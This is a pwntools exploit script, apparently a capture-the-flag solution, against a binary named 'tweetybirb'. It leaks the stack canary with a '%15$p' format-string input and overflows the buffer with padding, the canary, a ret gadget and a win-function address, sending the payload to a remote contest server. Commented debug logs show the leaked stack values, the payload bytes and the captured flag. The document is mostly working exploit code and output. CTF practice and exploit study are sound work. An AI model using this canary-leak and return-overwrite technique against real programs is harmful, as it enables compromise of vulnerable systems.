from pwn import *
import os
import random
import time

elf = context.binary = ELF("tweetybirb")
libc = elf.libc
context.log_level = "DEBUG"
context.aslr=None

gs = '''
break *0x401236
'''

# 0x40126a cmp canary
# printf': 0x4198596

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return remote('143.198.184.186',5002)
        return process(elf.path)

# 1.- Leaking

c=cyclic_metasploit(32)
printff=p64(0x4198596)
winf=p64(0x4011de)
ret=p64(0x40101a)
print(elf.plt)
print(elf.symbols)
print('*'*60)

# 0x40101a : ret


# leak stack
# for i in range(1,100):
#     p=start()
#     p.sendlineafter("magpies?",b'%'+bytes(str(i),'utf-8')+b'$p')
#     leak=p.recvline()
#     leak=p.recvline()
#     print('leak======> ',i,' ',leak)
#     p.sendlineafter('fowl?',c)
#     p.close()
index=15
p=start()
p.sendlineafter("magpies?",b'%'+bytes(str(index),'utf-8')+b'$p')
leak=p.recvline()
leak=p.recvline()
canary=p64(int(leak,16))
print('canary======> ',index,' ',leak)
padd=b'A'*72
exp=padd+canary+ret+winf
p.sendlineafter('fowl?',exp)
# p.sendlineafter('magpies?',exp)

p.interactive()

#   [DEBUG] Received 0x3b3 bytes:
    # 0x7ffff7dcda83        0x7ffff7dcf8d0      0x7ffff7dcda00      0x7ffff7dcf8c0      0x7ffff7fe14c0      0x7025207025207025  0x2520702520702520  0x2070252070252070 
    # 0x7025207025207025    0x2520702520702520  0x2070252070252070  0x7025207025207025  0x2520702520702520  0x2070252070252070  0x7025207025207025  0x2520702520702520
    # 0x2070252070252070    0x7025207025207025  0x2520702520702520  0x2070252070252070  0x7025207025207025  0x2520702520702520  0x2070252070252070   0x7025207025207025 
    # 0x2520702520702520    0x2070252070252070  0x7025207025207025  0xeec6cf0020702520  0xeec6dfb426302dd1  0x7fff00000000      (nil)               (nil)
    # 0x7ffff7de38d3        0x7ffff7dc9638      0x1ac7fd88          (nil)               (nil)               (nil)               0x4010f0            0x7fffffffdf60 
    # 0x40111e              0x7fffffffdf58      0x1c                0x1                 0x7fffffffe2a1      (nil)               0x7fffffffe2dd      0x7fffffffe2f3  
    # 0x7fffffffe8df        0x7fffffffe901      0x7fffffffe918      0x7fffffffe92b      0x7fffffffe93c      0x7fffffffe94c      0x7fffffffe957      0x7fffffffe986
    # 0x7fffffffe9a6        0x7fffffffe9ba      0x7fffffffe9ce      0x7fffffffe9d9'

# [+] Opening connection to 143.198.184.186 on port 5002: Done
# [DEBUG] Received 0xd3 bytes:
#     b"What are these errors the compiler is giving me about gets and printf? Whatever, I have this little tweety birb protectinig me so it's not like you hacker can do anything. Anyways, what do you think of magpies?\n"
# [DEBUG] Sent 0x6 bytes:
#     b'%15$p\n'
# [DEBUG] Received 0x3c bytes:
#     b'0x23ac5081f78fa700\n'
#     b'hmmm interesting. What about water fowl?\n'
# canary======>  15   b'0x23ac5081f78fa700\n'
# [DEBUG] Sent 0x61 bytes:
#     00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
#     *
#     00000040  41 41 41 41  41 41 41 41  00 a7 8f f7  81 50 ac 23  │AAAA│AAAA│····│·P·#│
#     00000050  1a 10 40 00  00 00 00 00  de 11 40 00  00 00 00 00  │··@·│····│··@·│····│
#     00000060  0a                                                  │·│
#     00000061
# [*] Switching to interactive mode

# [DEBUG] Received 0x54 bytes:
#     b'kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}\n'
# kqctf{tweet_tweet_did_you_leak_or_bruteforce_..._plz_dont_say_you_tried_bruteforce}